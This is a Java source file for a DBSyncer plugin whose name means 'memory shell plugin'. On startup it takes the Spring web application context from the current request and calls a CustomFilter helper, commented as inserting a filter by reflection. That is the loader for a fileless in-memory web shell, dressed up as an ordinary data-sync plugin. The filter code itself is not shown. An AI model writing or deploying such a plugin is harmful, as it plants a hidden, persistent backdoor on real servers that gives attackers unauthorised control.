package org.test;

import org.dbsyncer.sdk.plugin.PluginContext;
import org.dbsyncer.sdk.spi.PluginService;
import javax.annotation.PostConstruct;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
public class MyPlugin implements PluginService {

    private WebApplicationContext context;

    @PostConstruct
    public void init() {
        try {
            context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
            CustomFilter.addCustomFilter(context); // 调用反射插入过滤器
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }

    @Override
    public void convert(PluginContext pluginContext) {
    }

    @Override
    public void postProcessAfter(PluginContext context) {
    }

    @Override
    public String getVersion() {
        return "1.0.0";
    }

    @Override
    public String getName() {
        return "内存马插件";
    }
}